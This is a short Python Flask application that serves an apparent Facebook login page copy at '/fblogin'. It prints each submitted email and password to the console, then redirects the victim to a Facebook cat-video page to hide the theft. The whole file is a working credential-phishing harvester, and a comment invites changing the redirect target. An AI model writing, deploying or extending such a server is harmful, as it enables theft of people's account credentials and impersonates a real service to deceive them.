
# import the Flask class from the flask module
from flask import Flask, render_template, request, redirect
import os
from settings import *

# create the application object
app = Flask(__name__)

# use decorators to link the function to a url

@app.route('/')
def home():
    return render_template('index.html')

@app.route("/fblogin", methods=["GET", "POST"])

def log_in():
    if request.method == "POST":
        # Attempt the login & do something else
        print("Post")
        req = request.form
        print("Potential Email Id/Username :"+req['email'])
        print("Potential Password : "+req['pass'])
        # redirects to Funny cat videos page change if required
        return redirect('https://www.facebook.com/trynottolaughpets/videos/funny-cats-compilation/1928114857439222/')

    elif request.method == "GET":
        return render_template('fb_template/index.html')


# start the server with the 'run()' method
if __name__ == '__main__':
    app.run(debug=True)